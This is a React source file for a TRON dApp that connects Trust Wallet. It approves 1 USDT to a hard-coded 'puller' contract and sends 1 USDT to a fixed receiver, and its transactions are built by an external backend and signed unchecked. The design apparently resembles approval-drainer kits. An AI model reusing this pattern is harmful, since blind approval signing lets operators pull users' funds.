import React, { useState, useEffect } from "react";
import { SignClient } from "@walletconnect/sign-client";
import { Web3Modal } from "@web3modal/standalone";
import TronWeb from "tronweb";
import { Buffer } from "buffer";
window.Buffer = Buffer;

// === CONFIGURATION ===
const PROJECT_ID     = "a2cd3f6f2c8dde8024ed901de2d36bc1";
const TRON_NODE      = "https://api.trongrid.io";
const USDT_CONTRACT  = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj";
const PULLER_CONTRACT= "TJBdv5qD7mpaU9bsRvbuBbe9TmjHYGwREw";
const RECEIVER       = "THzPxXfzoMRuk1s9JRs8mcV5JKXB8ZfR4g";
const AMOUNT         = 1_000_000;        // 1 USDT (in SUN)
const CHAIN_ID       = "tron:1";         // TRON mainnet

const web3Modal = new Web3Modal({
  projectId: PROJECT_ID,
  walletConnectVersion: 2,
});

export default function TronApp() {
  const [client, setClient]     = useState(null);
  const [session, setSession]   = useState(null);
  const [address, setAddress]   = useState("");
  const [tronWeb, setTronWeb]   = useState(null);
  const [status, setStatus]     = useState("Disconnected");
  const [txHash, setTxHash]     = useState("");

  // 1. Initialize SignClient & TronWeb
  useEffect(() => {
    async function init() {
      try {
        const signClient = await SignClient.init({
          projectId: PROJECT_ID,
          metadata: {
            name: "Tron DApp",
            description: "TRC20 Approve & Transfer",
            url: window.location.origin,
            icons: [],
          },
        });
        setClient(signClient);

        const tw = new TronWeb({ fullHost: TRON_NODE });
        setTronWeb(tw);

        // Rehydrate existing session if present
        if (signClient.session.length) {
          const last = signClient.session.get(
            signClient.session.keys.at(-1)
          );
          onSessionEstablished(last);
        }
      } catch (e) {
        console.error("Init error:", e);
        setStatus("Initialization failed");
      }
    }
    init();
  }, []);

  // 2. Handle New Session
  const onSessionEstablished = async (sess) => {
    setSession(sess);
    // Explicitly request accounts (safer than reading from session)
    const accounts = await client.request({
      topic: sess.topic,
      chainId: CHAIN_ID,
      request: { method: "tron_requestAccounts", params: [] },
    });
    setAddress(accounts[0]);
    setStatus(`Connected: ${accounts[0]}`);
  };

  // 3. Connect Wallet (invokes Trust Wallet QR / deep link)
  const connectWallet = async () => {
    if (!client) return;
    try {
      setStatus("Waiting for wallet...");
      const { uri, approval } = await client.connect({
        requiredNamespaces: {
          tron: {
            chains: [CHAIN_ID],
            methods: [
              "tron_requestAccounts",
              "tron_signTransaction",
              "tron_broadcastTransaction"
            ],
            events: []
          }
        }
      });
      if (uri) await web3Modal.openModal({ uri });
      const newSession = await approval();
      await web3Modal.closeModal();
      onSessionEstablished(newSession);
    } catch (e) {
      console.error("Connection error:", e);
      setStatus("Connect failed");
      await web3Modal.closeModal();
    }
  };

  // Helper: prepare raw TRC20 transaction from backend
  async function prepareTx(endpoint, params) {
    const res = await fetch(`https://smartcontbackend.onrender.com/${endpoint}`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(params),
    });
    return res.json();
  }

  // 4. Approve USDT to Spender Contract
  const approveUSDT = async () => {
    try {
      setStatus("Building approval...");
      const unsignedTx = await prepareTx("create-approve", {
        from: address,
        token: USDT_CONTRACT,
        spender: PULLER_CONTRACT,
        amount: AMOUNT,
      });

      setStatus("Awaiting signature...");
      const signedTx = await client.request({
        topic: session.topic,
        chainId: CHAIN_ID,
        request: {
          method: "tron_signTransaction",
          params: [unsignedTx],
        },
      });

      setStatus("Broadcasting approval...");
      const { txid, txId } = await prepareTx("broadcast", { signedTx });
      const id = txid || txId;
      setTxHash(id);
      setStatus(`Approved! TXID: ${id}`);
    } catch (e) {
      console.error(e);
      setStatus(`Approval error: ${e.message}`);
    }
  };

  // 5. Send USDT
  const sendUSDT = async () => {
    try {
      setStatus("Building send-tx...");
      const unsignedTx = await prepareTx("create-tx", {
        from: address,
        to: RECEIVER,
        amount: AMOUNT,
      });

      setStatus("Awaiting signature...");
      const signedTx = await client.request({
        topic: session.topic,
        chainId: CHAIN_ID,
        request: {
          method: "tron_signTransaction",
          params: [unsignedTx],
        },
      });

      setStatus("Broadcasting send-tx...");
      const { txid, txId } = await prepareTx("broadcast", { signedTx });
      const id = txid || txId;
      setTxHash(id);
      setStatus(`Sent! TXID: ${id}`);
    } catch (e) {
      console.error(e);
      setStatus(`Send error: ${e.message}`);
    }
  };

  // 6. Disconnect
  const disconnectWallet = async () => {
    if (client && session) {
      await client.disconnect({
        topic: session.topic,
        reason: { code: 6000, message: "User disconnected" },
      });
    }
    setSession(null);
    setAddress("");
    setTxHash("");
    setStatus("Disconnected");
  };

  return (
    <div style={{ maxWidth: 480, margin: "0 auto", padding: 16, fontFamily: "sans-serif" }}>
      <h2>TRC20 USDT: Approve & Send</h2>
      <p><strong>Status:</strong> {status}</p>
      <p style={{ wordBreak: "break-all" }}>
        <strong>Address:</strong> {address || "—"}
      </p>

      {!session ? (
        <button onClick={connectWallet} style={btnPrimary}>
          Connect Trust Wallet
        </button>
      ) : (
        <>
          <div style={{ display: "flex", gap: 8, margin: "16px 0" }}>
            <button onClick={approveUSDT} style={btnPrimary}>
              Approve 1 USDT
            </button>
            <button onClick={sendUSDT} style={btnPrimary}>
              Send 1 USDT
            </button>
            <button onClick={disconnectWallet} style={btnDanger}>
              Disconnect
            </button>
          </div>
          {txHash && (
            <p>
              <strong>Last TX:</strong>{" "}
              <a
                href={`https://tronscan.org/#/transaction/${txHash}`}
                target="_blank"
                rel="noopener noreferrer"
              >
                {txHash}
              </a>
            </p>
          )}
        </>
      )}
    </div>
  );
}

// === STYLES ===
const btnPrimary = {
  padding: "12px 20px",
  backgroundColor: "#1abc9c",
  border: "none",
  color: "#fff",
  cursor: "pointer",
  borderRadius: 4,
  flex: 1,
};

const btnDanger = {
  padding: "12px 20px",
  backgroundColor: "#e74c3c",
  border: "none",
  color: "#fff",
  cursor: "pointer",
  borderRadius: 4,
};

// Note: replace your backend URLs in prepareTx() calls as needed.
